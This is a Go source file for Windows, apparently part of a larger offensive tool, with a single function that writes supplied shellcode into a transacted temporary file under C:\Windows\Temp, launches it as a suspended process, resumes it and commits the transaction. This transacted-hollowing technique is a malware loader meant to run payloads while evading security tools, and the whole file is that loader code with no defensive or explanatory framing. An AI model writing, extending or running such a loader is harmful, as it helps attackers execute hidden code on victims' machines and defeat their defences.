//go:build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	ktmw32                    = syscall.NewLazyDLL("ktmw32.dll")
	procCreateTransaction     = ktmw32.NewProc("CreateTransaction")
	procCreateFileTransactedW = ktmw32.NewProc("CreateFileTransactedW")
	procCommitTransaction     = ktmw32.NewProc("CommitTransaction")
	procRollbackTransaction   = ktmw32.NewProc("RollbackTransaction")
	procWriteFile             = k32.NewProc("WriteFile")
)

func transactedHollow(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	hTx, _, _ := procCreateTransaction.Call(
		0, 0, 0, 0, 0, 0, 0,
	)
	if hTx == 0 {
		return fmt.Errorf("CreateTransaction failed")
	}
	defer procCloseHandle.Call(hTx)

	tmpName := fmt.Sprintf("C:\\Windows\\Temp\\%x.dll", rng.Uint64())
	tmpNamePtr, _ := syscall.UTF16PtrFromString(tmpName)

	hFile, _, _ := procCreateFileTransactedW.Call(
		uintptr(unsafe.Pointer(tmpNamePtr)),
		0x40000000,
		0,
		0,
		2,
		0x80,
		0,
		hTx,
		0,
		0,
	)
	if hFile == 0 {
		procRollbackTransaction.Call(hTx)
		return fmt.Errorf("CreateFileTransactedW failed")
	}
	defer procCloseHandle.Call(hFile)

	var written uint32
	r1, _, _ := procWriteFile.Call(
		hFile,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
		0,
	)
	if r1 == 0 {
		procRollbackTransaction.Call(hTx)
		return fmt.Errorf("WriteFile failed")
	}

	exePtr, _ := syscall.UTF16PtrFromString(tmpName)
	var si startupInfoExW
	si.cb = uint32(unsafe.Sizeof(si))
	si.dwFlags = 0x00000001
	var pi processInformation

	r2, _, _ := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(exePtr)), 0, 0, 0, 0,
		uintptr(createSuspended), 0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r2 == 0 {
		procRollbackTransaction.Call(hTx)
		return fmt.Errorf("CreateProcessW from transacted file failed")
	}

	procResumeThread.Call(pi.hThread)
	procCloseHandle.Call(pi.hThread)
	procCloseHandle.Call(pi.hProcess)

	procCommitTransaction.Call(hTx)
	return nil
}
